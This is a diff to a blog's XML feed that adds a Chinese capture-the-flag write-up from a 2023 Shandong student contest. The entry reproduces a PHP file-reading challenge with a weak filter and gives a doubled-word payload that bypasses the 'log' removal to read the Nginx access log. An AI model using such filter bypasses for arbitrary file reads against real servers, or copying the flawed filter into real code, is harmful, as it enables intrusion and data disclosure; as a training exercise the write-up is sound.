@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>2023 技能兴鲁“信息创大赛” 学生组 日志里的Flag</title>
+    <link href="/2023/11/16/2023%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/"/>
+    <url>/2023/11/16/2023%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/</url>
+    
+    <content type="html"><![CDATA[<h3 id="日志里的FLAG："><a href="#日志里的FLAG：" class="headerlink" title="日志里的FLAG："></a>日志里的FLAG：</h3><span id="more"></span><blockquote><p>提示说在日志里面，访问网页探测为Nginx服务器，读nginx对应的日志：<br>分析服务器为Nginx 读取对应日志位置<br>上代码：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;FLAG就存在于日志文件里哦！&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|\$|[&quot;\&#x27;]/i&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;log&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$path</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-variable">$content</span>, <span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件不存在&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;请提供文件路径&quot;</span>;<br>&#125;<br>FLAG就存在于日志文件里哦！请提供文件路径<br></code></pre></td></tr></table></figure><p><code> $path = str_replace(&quot;log&quot;,&quot;&quot;, $path);</code>替换,使用双写进行绕过</p><p><code>/var/lologg/nginx/access.llogog</code></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p> <code>?path=/var/lologg/nginx/access.llogog</code>‘</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络安全</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>使用微信推送课程消息</title>
     <link href="/2022/11/17/%E4%BD%BF%E7%94%A8%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81%E8%AF%BE%E7%A8%8B%E4%BF%A1%E6%81%AF/"/>
     <url>/2022/11/17/%E4%BD%BF%E7%94%A8%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81%E8%AF%BE%E7%A8%8B%E4%BF%A1%E6%81%AF/</url>
